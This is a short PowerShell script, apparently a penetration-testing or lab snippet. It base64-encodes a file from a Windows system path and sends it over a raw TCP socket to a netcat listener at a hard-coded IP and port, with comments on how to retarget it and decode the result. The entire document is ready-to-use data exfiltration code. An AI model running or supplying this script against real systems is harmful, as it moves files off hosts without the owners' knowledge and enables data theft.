# Send a base64 encoded file to a listening NetCat instance
# Get the original file by running "base64 -d" on the encoded data on a Linux box.
# 
# Change file path in the first line
# Change IP and port in 2nd line

$test=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\windows\system32\windowspowershell\v1.0\modules\smbshare\disableunusedsmb1.ps1"));
$Socket = New-Object System.Net.Sockets.TCPClient('10.10.13.37',1337);
$Stream = $Socket.GetStream();
$Writer = New-Object System.IO.StreamWriter($Stream);
$Writer.WriteLine($test);
$Writer.Flush();
$Stream.Close();
$Socket.Close();
